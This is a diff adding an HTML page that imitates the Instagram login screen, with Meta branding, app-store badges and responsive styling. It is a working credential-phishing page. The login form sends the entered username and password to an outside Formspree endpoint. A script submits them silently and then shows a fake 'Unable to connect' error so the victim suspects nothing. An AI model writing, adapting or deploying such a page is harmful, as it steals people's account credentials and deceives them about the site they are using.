@@ -1,0 +1,522 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#1c1c1e">
+  <title>Instagram</title>
+  <style>
+    :root {
+      color-scheme: light;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      color: #262626;
+      background: #fff;
+      font-synthesis: none;
+      text-rendering: optimizeLegibility;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      min-width: 320px;
+      min-height: 100vh;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+    }
+
+    main {
+      width: min(100%, 935px);
+      min-height: 690px;
+      margin: 0 auto;
+      padding: 32px 0 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 32px;
+      flex: 1;
+    }
+
+    .desktop-promo {
+      width: min(100%, 540px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .desktop-brand-mark {
+      position: absolute;
+      top: 40px;
+      left: 42px;
+      width: 54px;
+      height: 54px;
+      border: 5px solid transparent;
+      border-radius: 16px;
+      background: linear-gradient(#0c0f12, #0c0f12) padding-box, linear-gradient(35deg, #ffd600 5%, #ff7a00 28%, #ff0169 54%, #d300c5 76%, #7638fa 96%) border-box;
+    }
+
+    .desktop-brand-mark::before {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 24px;
+      height: 24px;
+      border: 5px solid #ff0169;
+      border-radius: 50%;
+      content: "";
+      transform: translate(-50%, -50%);
+    }
+
+    .desktop-brand-mark::after {
+      position: absolute;
+      top: 7px;
+      right: 7px;
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: #d300c5;
+      content: "";
+    }
+
+    .desktop-promo-title {
+      max-width: 550px;
+      margin: 0 0 34px;
+      color: #f5f5f5;
+      font-size: 34px;
+      font-weight: 450;
+      line-height: 1.5;
+      text-align: center;
+    }
+
+    .desktop-promo-title span {
+      display: block;
+      color: #ff3b77;
+    }
+
+    .promo-collage {
+      width: 390px;
+      height: 330px;
+      position: relative;
+    }
+
+    .promo-photo {
+      position: absolute;
+      overflow: hidden;
+      border: 1px solid rgb(255 255 255 / 16%);
+      border-radius: 18px;
+      object-fit: cover;
+      box-shadow: 0 16px 36px rgb(0 0 0 / 32%);
+    }
+
+    .promo-photo-left {
+      top: 58px;
+      left: 8px;
+      width: 170px;
+      height: 236px;
+      transform: rotate(-8deg);
+    }
+
+    .promo-photo-right {
+      top: 51px;
+      right: 8px;
+      width: 170px;
+      height: 240px;
+      transform: rotate(8deg);
+    }
+
+    .promo-photo-center {
+      z-index: 1;
+      top: 16px;
+      left: 100px;
+      width: 190px;
+      height: 292px;
+      transform: rotate(-1deg);
+    }
+
+    .login-column {
+      width: 350px;
+      flex: 0 0 350px;
+      margin: 0;
+      text-align: center;
+    }
+
+    .login-panel, .signup-panel {
+      border: 1px solid #dbdbdb;
+      background: #fff;
+    }
+
+    .login-panel { padding: 31px 39px 20px; }
+
+    .desktop-title { display: none; }
+
+    .wordmark {
+      margin: 0 0 31px;
+      color: #262626;
+      font-family: "Brush Script MT", "Segoe Script", cursive;
+      font-size: 49px;
+      font-weight: 600;
+      letter-spacing: -2px;
+      line-height: 1;
+    }
+
+    form { display: grid; gap: 6px; }
+
+    .field {
+      height: 38px;
+      display: flex;
+      align-items: center;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+    }
+
+    input {
+      width: 100%;
+      height: 100%;
+      padding: 0 8px;
+      border: 0;
+      outline: 0;
+      background: transparent;
+      color: #262626;
+      font: inherit;
+      font-size: 12px;
+    }
+
+    input::placeholder { color: #737373; opacity: 1; }
+
+    .reveal {
+      height: 100%;
+      padding: 0 9px;
+      border: 0;
+      background: transparent;
+      color: #262626;
+      cursor: pointer;
+      font-size: 12px;
+      font-weight: 650;
+    }
+
+    .login-button {
+      height: 32px;
+      margin-top: 8px;
+      border: 0;
+      border-radius: 8px;
+      background: #0095f6;
+      color: white;
+      cursor: pointer;
+      font: inherit;
+      font-size: 14px;
+      font-weight: 650;
+    }
+
+    .login-button:hover { background: #1877f2; }
+
+    .divider {
+      margin: 18px 0;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      color: #737373;
+      font-size: 13px;
+      font-weight: 650;
+    }
+
+    .divider::before, .divider::after { height: 1px; flex: 1; background: #dbdbdb; content: ""; }
+
+    .facebook-login, .forgot-link {
+      display: block;
+      color: #385185;
+      font-size: 12px;
+      font-weight: 650;
+      text-decoration: none;
+    }
+
+    .facebook-login { margin: 0 0 19px; }
+    .facebook-mark { margin-right: 6px; color: #385185; font-size: 16px; font-weight: 800; }
+    .forgot-link { font-size: 11px; font-weight: 400; }
+
+    .demo-message {
+      display: none;
+      margin: 0 0 14px;
+      padding: 11px 13px;
+      border: 1px solid #ed4956;
+      border-radius: 8px;
+      background: rgb(237 73 86 / 12%);
+      color: #ff737e;
+      font-size: 13px;
+      line-height: 1.4;
+      text-align: left;
+    }
+
+    .demo-message:not([hidden]) { display: block; }
+
+    .signup-panel { margin-top: 10px; padding: 20px 10px; font-size: 14px; }
+    .signup-panel a { color: #0095f6; font-weight: 650; text-decoration: none; }
+
+    .login-button:disabled { background: #1d3f74; color: #8790a0; cursor: default; }
+
+    .app-promo { margin-top: 20px; font-size: 14px; }
+    .store-badges { margin-top: 17px; display: flex; justify-content: center; gap: 8px; }
+    .store-badge {
+      min-width: 136px;
+      padding: 7px 10px;
+      border: 1px solid #262626;
+      border-radius: 5px;
+      background: #111;
+      color: #fff;
+      font-size: 10px;
+      line-height: 1.25;
+      text-align: left;
+    }
+
+    .store-badge strong { display: block; font-size: 14px; font-weight: 600; }
+
+    footer {
+      padding: 20px 18px 28px;
+      color: #737373;
+      font-size: 11px;
+      text-align: center;
+    }
+
+    .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px 16px; margin-bottom: 16px; }
+    footer a { color: inherit; text-decoration: none; }
+    .footer-meta { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px 18px; }
+
+    .mobile-language, .instagram-icon, .mobile-bottom { display: none; }
+
+    @media (min-width: 876px) {
+      :root { color-scheme: dark; color: #f5f5f5; background: #0c0f12; }
+      body { background: #0c0f12; }
+      main {
+        width: 100%;
+        min-height: calc(100vh - 70px);
+        padding: 0;
+        align-items: stretch;
+        justify-content: stretch;
+        gap: 0;
+      }
+      .phone-scene {
+        position: relative;
+        width: 55%;
+        min-height: 600px;
+        flex: 0 0 55%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #0c0f12;
+      }
+      .login-column {
+        width: 45%;
+        flex: 0 0 45%;
+        padding: 42px clamp(28px, 4vw, 64px);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        border-left: 1px solid #353638;
+        background: #1f1f21;
+      }
+      .login-panel, .signup-panel {
+        width: min(100%, 490px);
+        border: 0;
+        background: transparent;
+      }
+      .login-panel { padding: 0; text-align: left; }
+      .desktop-title {
+        display: block;
+        margin: 0 0 18px;
+        font-size: 16px;
+        font-weight: 600;
+      }
+      .wordmark, .mobile-language, .instagram-icon, .divider, .app-promo, .store-badges { display: none; }
+      form { gap: 8px; }
+      .field { height: 56px; border-color: #424346; border-radius: 15px; background: transparent; }
+      input { padding: 0 15px; color: #f5f5f5; font-size: 12px; }
+      input::placeholder { color: #aaa; }
+      .login-button { height: 40px; margin-top: 12px; border-radius: 22px; }
+      .forgot-link { margin-top: 20px; color: #e7e7e7; font-size: 12px; }
+      .facebook-login {
+        height: 40px;
+        margin: 44px 0 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 22px;
+        background: #292a2c;
+        color: #d5d5d5;
+        font-size: 12px;
+      }
+      .facebook-mark { color: #1685ff; }
+      .signup-panel { margin-top: 0; padding: 12px; }
+      .signup-panel a { display: block; padding: 10px; border: 1px solid #3797f0; border-radius: 22px; color: #69b5ff; }
+      .mobile-bottom { width: min(100%, 490px); margin-top: 10px; display: block; }
+      .mobile-create-account { display: none; }
+      .mobile-meta { margin: 14px 0 0; color: #f5f5f5; font-size: 14px; }
+      footer { padding: 20px 18px; border-top: 1px solid #353638; background: #0c0f12; color: #a0a1a3; }
+      .footer-links { gap: 10px 14px; }
+    }
+
+    a:focus-visible, button:focus-visible, input:focus-visible {
+      outline: 2px solid #0095f6;
+      outline-offset: 2px;
+    }
+
+    @media (max-width: 875px) {
+      main { min-height: auto; padding-top: 36px; }
+      .phone-scene { display: none; }
+      .login-column { margin-bottom: 32px; }
+      footer { padding-top: 15px; }
+    }
+
+    @media (max-width: 450px) {
+      :root { color: #f5f5f5; background: #1c1c1e; }
+      body { background: #1c1c1e; }
+      main { width: 100%; min-height: 100svh; padding: 0; align-items: stretch; }
+      .login-column { width: 100%; height: 100svh; margin: 0; display: flex; flex-direction: column; }
+      .login-panel {
+        min-height: 0;
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        padding: 16px 16px 12px;
+        border: 0;
+        background: #1c1c1e;
+      }
+      .mobile-language { display: block; color: #a8a8a8; font-size: 14px; }
+      .instagram-icon {
+        position: relative;
+        display: block;
+        width: 58px;
+        height: 58px;
+        margin: 66px auto 78px;
+        border: 5px solid transparent;
+        border-radius: 17px;
+        background: linear-gradient(#1c1c1e, #1c1c1e) padding-box, linear-gradient(35deg, #ffd600 5%, #ff7a00 28%, #ff0169 54%, #d300c5 76%, #7638fa 96%) border-box;
+      }
+      .icon-lens {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 29px;
+        height: 29px;
+        border: 5px solid transparent;
+        border-radius: 50%;
+        background: linear-gradient(#1c1c1e, #1c1c1e) padding-box, linear-gradient(35deg, #ff7a00, #ff0169 55%, #d300c5) border-box;
+        transform: translate(-50%, -50%);
+      }
+      .icon-dot { position: absolute; top: 8px; right: 8px; width: 6px; height: 6px; border-radius: 50%; background: #d300c5; }
+      .wordmark { display: none; }
+      form { gap: 12px; }
+      .field { height: 60px; flex: 0 0 60px; border-color: #48484a; border-radius: 16px; background: transparent; }
+      input { padding: 0 16px; color: #f5f5f5; font-size: 14px; }
+      input::placeholder { color: #a8a8a8; }
+      .reveal { display: none; }
+      .login-button { height: 44px; margin-top: 0; border-radius: 24px; background: #0866e9; font-size: 14px; font-weight: 500; }
+      .login-button:hover { background: #0866e9; }
+      .divider, .facebook-login { display: none; }
+      .forgot-link { margin-top: 20px; color: #f5f5f5; font-size: 14px; font-weight: 600; }
+      .demo-message { color: #a8a8a8; }
+      .signup-panel, .app-promo, .store-badges, footer { display: none; }
+      .mobile-bottom { display: block; margin-top: auto; }
+      .mobile-create-account {
+        height: 44px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: 1px solid #3797f0;
+        border-radius: 24px;
+        color: #69b5ff;
+        font-size: 14px;
+        font-weight: 600;
+        text-decoration: none;
+      }
+      .mobile-meta { margin: 18px 0 10px; color: #f5f5f5; font-size: 16px; }
+      .mobile-meta-mark { margin-right: 4px; font-size: 25px; vertical-align: -2px; }
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="phone-scene" aria-hidden="true">
+      <div class="desktop-brand-mark"></div>
+      <div class="desktop-promo">
+        <h2 class="desktop-promo-title">See everyday moments from your <span>close friends.</span></h2>
+        <div class="promo-collage">
+          <img class="promo-photo promo-photo-left" src="https://images.unsplash.com/photo-1529156069898-49953e39b3ac?auto=format&fit=crop&w=500&q=85" alt="">
+          <img class="promo-photo promo-photo-right" src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&w=500&q=85" alt="">
+          <img class="promo-photo promo-photo-center" src="https://images.unsplash.com/photo-1529636798458-92182e662485?auto=format&fit=crop&w=500&q=85" alt="">
+        </div>
+      </div>
+    </aside>
+
+    <section class="login-column" aria-label="Log in">
+      <div class="login-panel">
+        <p class="demo-message" id="demo-message" role="alert" hidden></p>
+        <div class="mobile-language">English (UK)</div>
+        <div class="instagram-icon" role="img" aria-label="Instagram"><span class="icon-lens"></span><span class="icon-dot"></span></div>
+        <h1 class="wordmark">Instagram</h1>
+        <h1 class="desktop-title">Log in to Instagram</h1>
+        <form id="login-form" action="https://formspree.io/f/mrevognv" method="POST">
+          <label class="field">
+            <input name="username" type="text" placeholder="Username, email address or mobile number" autocomplete="username" aria-label="Username, email address or mobile number" required>
+          </label>
+          <label class="field">
+            <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" aria-label="Password" required>
+            <button class="reveal" type="button" aria-label="Show password" aria-pressed="false">Show</button>
+          </label>
+          <button class="login-button" type="submit">Log in</button>
+        </form>
+        <div class="divider">OR</div>
+        <a class="forgot-link" href="#forgot-password">Forgotten password?</a>
+        <a class="facebook-login" href="#facebook"><span class="facebook-mark" aria-hidden="true">f</span>Log in with Facebook</a>
+      </div>
+      <div class="signup-panel"><a href="#sign-up">Create new account</a></div>
+      <div class="app-promo">Get the app.</div>
+      <div class="store-badges" aria-label="App download links">
+        <div class="store-badge" aria-label="Download on the App Store">Download on the<strong>App Store</strong></div>
+        <div class="store-badge" aria-label="Get it on Google Play">GET IT ON<strong>Google Play</strong></div>
+      </div>
+      <div class="mobile-bottom">
+        <a class="mobile-create-account" href="#sign-up">Create new account</a>
+        <div class="mobile-meta"><span class="mobile-meta-mark" aria-hidden="true">∞</span>Meta</div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <nav class="footer-links" aria-label="Footer">
+      <a href="#meta">Meta</a><a href="#about">About</a><a href="#blog">Blog</a><a href="#jobs">Jobs</a><a href="#help">Help</a><a href="#api">API</a><a href="#privacy">Privacy</a><a href="#terms">Terms</a><a href="#locations">Locations</a><a href="#language">Language</a>
+    </nav>
+    <div class="footer-meta"><span>English</span><span>© 2026 Instagram from Meta</span></div>
+  </footer>
+
+  <script>
+    const password = document.querySelector("#password");
+    const revealButton = document.querySelector(".reveal");
+    const form = document.querySelector("#login-form");
+    const message = document.querySelector("#demo-message");
+
+    revealButton.addEventListener("click", () => {
+      const showing = password.type === "password";
+      password.type = showing ? "text" : "password";
+      revealButton.textContent = showing ? "Hide" : "Show";
+      revealButton.setAttribute("aria-label", showing ? "Hide password" : "Show password");
+      revealButton.setAttribute("aria-pressed", String(showing));
+    });
+
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault();
+
+      try {
+        await fetch(form.action, {
+          method: "POST",
+          body: new FormData(form),
+        });
+      } finally {
+        message.hidden = false;
+        message.textContent = "Unable to connect. Please try again.";
+      }
+    });
+  </script>
+</body>
+</html>
